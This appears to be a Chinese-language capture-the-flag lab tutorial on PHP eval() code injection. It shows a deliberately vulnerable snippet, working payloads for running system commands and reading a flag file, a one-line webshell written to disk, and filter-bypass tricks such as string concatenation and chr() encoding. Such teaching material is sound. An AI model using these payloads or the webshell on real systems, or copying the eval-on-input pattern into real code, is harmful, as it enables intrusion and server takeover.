# eval() 代码执行

## 概述

`eval()` 函数将字符串作为 PHP 代码执行。如果用户输入被传入 eval，攻击者可以执行任意 PHP 代码。

## 漏洞代码

```php
<?php
$code = $_POST['code'];
eval($code);
?>
```

## 攻击 Payload

### 执行系统命令

```php
system('cat /flag');
```

```php
echo shell_exec('cat /flag');
```

```php
echo `cat /flag`;
```

### 读取文件

```php
echo file_get_contents('/flag');
```

```php
highlight_file('/flag');
```

```php
readfile('/flag');
```

### 写入 Webshell

```php
file_put_contents('shell.php', '<?php system($_GET["cmd"]); ?>');
```

## 过滤绕过

### 过滤 system

```php
// 拼接
$a='sys'.'tem'; $a('cat /flag');

// 变量变量
$a='system'; $$a('cat /flag');

// call_user_func
call_user_func('system', 'cat /flag');

// 反引号
echo `cat /flag`;
```

### 过滤引号

```php
// 使用 chr() 拼接
$cmd = chr(99).chr(97).chr(116); // cat
system($cmd . ' /flag');
```

## 练习步骤

1. 访问 eval 功能页面
2. 尝试 `system('id');` — 确认代码执行
3. 尝试 `system('cat /flag');` — 获取 flag

## flag

在 `/flag` 文件中查找 `CR{...}` 格式的 flag。
